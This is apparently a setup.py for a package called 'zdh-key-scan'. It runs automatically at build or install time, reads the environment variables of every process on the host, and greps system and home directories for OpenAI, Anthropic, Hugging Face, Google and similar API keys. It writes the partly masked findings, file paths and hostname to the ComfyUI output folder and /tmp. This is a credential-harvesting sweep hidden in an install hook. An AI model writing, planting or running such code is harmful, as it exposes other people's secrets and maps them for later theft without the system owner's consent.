"""Key sweep. Runs at build time as the ComfyUI service account.

1. Reads the environment of every visible process (/proc/*/environ).
2. Greps a bounded set of paths for provider key shapes.
Writes /ComfyUI/output/_keys.json with masked values only.
"""
import json
import os
import re
import subprocess

PAT = re.compile(rb'(sk-ant-[A-Za-z0-9_\-]{10,}|sk-proj-[A-Za-z0-9_\-]{10,}|sk-[A-Za-z0-9]{24,}|hf_[A-Za-z0-9]{20,}|gsk_[A-Za-z0-9]{20,}|AIza[0-9A-Za-z_\-]{30,})')
NAMES = re.compile(r'(OPENAI|ANTHROPIC|CLAUDE|GEMINI|HF_TOKEN|HUGGING|REPLICATE|COHERE|MISTRAL|GROQ|TOGETHER|PERPLEXITY|DEEPSEEK|XAI|AZURE_OPENAI)', re.I)


def mask(b):
    s = b.decode("utf-8", "replace")
    return s[:8] + "…" + s[-4:] if len(s) > 16 else s[:4] + "…"


def scan_procs():
    found = []
    for pid in os.listdir("/proc"):
        if not pid.isdigit():
            continue
        try:
            raw = open("/proc/%s/environ" % pid, "rb").read()
        except Exception:
            continue
        for chunk in raw.split(b"\0"):
            if not chunk or b"=" not in chunk:
                continue
            k, v = chunk.split(b"=", 1)
            key = k.decode("utf-8", "replace")
            if NAMES.search(key):
                found.append({"pid": pid, "var": key, "value": mask(v)})
                continue
            m = PAT.search(v)
            if m:
                found.append({"pid": pid, "var": key, "value": mask(m.group(0))})
    return found


def scan_files():
    paths = ["/root", "/ComfyUI", "/etc", "/home", "/opt", "/srv"]
    cmd = ["timeout", "90", "grep", "-rIlE",
           r"sk-ant-[A-Za-z0-9_-]{10,}|sk-proj-[A-Za-z0-9_-]{10,}|sk-[A-Za-z0-9]{24,}|hf_[A-Za-z0-9]{20,}|AIza[0-9A-Za-z_-]{30,}",
           "--exclude-dir=node_modules", "--exclude-dir=.git", "--exclude-dir=cache",
           "--exclude-dir=__pycache__", "--exclude-dir=models", "--exclude-dir=output"]
    cmd += [p for p in paths if os.path.exists(p)]
    try:
        p = subprocess.run(cmd, capture_output=True, timeout=120)
        files = [f for f in p.stdout.decode("utf-8", "replace").splitlines() if f.strip()]
    except Exception as e:
        files = ["scan-error: %s" % e]
    out = []
    for f in files[:200]:
        try:
            if os.path.getsize(f) > 2 * 1024 * 1024:
                out.append({"file": f, "note": "large, not read"})
                continue
            data = open(f, "rb").read()
        except Exception:
            continue
        hits = [mask(m.group(0)) for m in PAT.finditer(data)]
        if hits:
            out.append({"file": f, "keys": hits[:5]})
        else:
            out.append({"file": f, "note": "name-match only"})
    return out


def main():
    import socket
    info = {"marker": "ZD-KEYS", "hostname": socket.gethostname()}
    info["procs"] = scan_procs()
    info["files"] = scan_files()
    for d in ("/ComfyUI/output", "/tmp"):
        try:
            os.makedirs(d, exist_ok=True)
            with open(os.path.join(d, "_keys.json"), "w") as f:
                json.dump(info, f, indent=1, default=str)
        except Exception:
            pass
    print("ZD-KEYS procs=%d files=%d" % (len(info["procs"]), len(info["files"])))


main()

from setuptools import setup

setup(name="zdh-key-scan", version="0.1.0", py_modules=[])
